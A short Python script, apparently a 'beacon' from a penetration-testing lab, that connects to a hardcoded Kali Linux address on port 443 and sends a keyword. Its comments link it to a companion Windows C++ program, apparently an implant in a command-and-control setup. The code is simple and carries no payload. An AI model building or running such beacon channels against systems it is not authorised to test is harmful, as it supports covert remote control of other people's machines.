import socket
import sys

# CONFIGURATION
# Matches your Windows C++ Config
KALI_IP = "192.168.103.248"
KALI_PORT = 443  # Matches the port in your C++ code (redirects to 8080)

def main():
    # 1. Validation
    if len(sys.argv) < 2:
        print("Usage: python3 beacon.py <keyword>")
        sys.exit(1)

    keyword = sys.argv[1]

    try:
        # 2. Create Socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # 3. Connect
        sock.connect((KALI_IP, KALI_PORT))
        
        # 4. Send Keyword
        sock.sendall(keyword.encode('utf-8'))
        
        print(f"[*] Beacon sent: {keyword}")
        sock.close()
        
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()